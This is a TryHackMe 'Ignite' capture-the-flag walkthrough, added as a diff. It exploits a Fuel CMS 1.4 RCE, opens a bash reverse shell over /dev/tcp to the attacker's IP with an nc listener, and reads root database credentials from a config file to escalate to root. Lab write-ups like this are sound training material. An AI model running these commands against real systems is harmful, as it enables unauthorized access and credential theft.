@@ -1,0 +1,75 @@
+///Ignite///
+https://tryhackme.com/room/ignite
+
+[NMAP]
+
+nmap -sV -T4 10.10.120.210
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-25 22:35 UTC
+Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 0.47% done
+Stats: 0:01:45 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 16.81% done; ETC: 22:46 (0:08:35 remaining)
+Warning: 10.10.120.210 giving up on port because retransmission cap hit (6).
+Stats: 0:12:02 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 96.71% done; ETC: 22:48 (0:00:25 remaining)
+Nmap scan report for 10.10.120.210
+Host is up (0.22s latency).
+Not shown: 65519 closed tcp ports (conn-refused)
+PORT      STATE    SERVICE          VERSION
+80/tcp    open     http             Apache httpd 2.4.18 ((Ubuntu))
+
+Visiting http://[machine IP]:80 shows us a Welcome to Fuel CMS
+Version 1.4 default page.
+
+Looking into an exploit for Fuel CMS, I found this: https://www.exploit-db.com/exploits/50477 - an RCE
+
+Syntax: python3 50477.py -u http://[machine IP]
+
+And we should see:
+[+]Connecting...
+Enter Command $
+
+Success!
+
+Although we are sort of stuck in the current directory, we can traverse with ls ../../.. etc. 
+
+There is a robots.txt file, which says to exclude the /fuel/ webpage, which is a login. The credentials are just admin:admin, but accessing this doesn't lead to anything.
+
+Checking the /home/ folder, the only user present is (oddly) named www-data. Here, we find the user flag.
+cat ../../../home/www-data/flag.txt
+
+To make this a bit easier, we can get a reverse shell by doing the following:
+
+Start a listener on your machine with: nc -lvnp [port number]
+
+RCE to the victim machine:
+echo "bash -i >& /dev/tcp/[your tun0 ip]/[port number] 0>&1" > /tmp/shell.sh
+bash /tmp/shell.sh
+
+Next, we can upgrade the shell with python: 
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+Poking around the config files in /var/www/html/fuel/application/config, catting out database.php reveals credentials at the very end:
+
+$db['default'] = array(
+        'dsn'   => '',
+        'hostname' => 'localhost',
+        'username' => 'root',
+        'password' => '(xxx Redacted xxx)',
+        'database' => 'fuel_schema',
+        'dbdriver' => 'mysqli',
+        'dbprefix' => '',
+        'pconnect' => FALSE,
+        'db_debug' => (ENVIRONMENT !== 'production'),
+        'cache_on' => FALSE,
+        'cachedir' => '',
+        'char_set' => 'utf8',
+        'dbcollat' => 'utf8_general_ci',
+        'swap_pre' => '',
+        'encrypt' => FALSE,
+        'compress' => FALSE,
+        'stricton' => FALSE,
+        'failover' => array(),
+        'save_queries' => TRUE
+
+We can now login as root! Enter su root and enter the password ~ congrats!
